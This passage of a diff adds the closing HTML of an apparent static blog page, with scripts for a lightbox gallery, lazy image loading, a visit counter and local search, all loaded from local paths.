+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
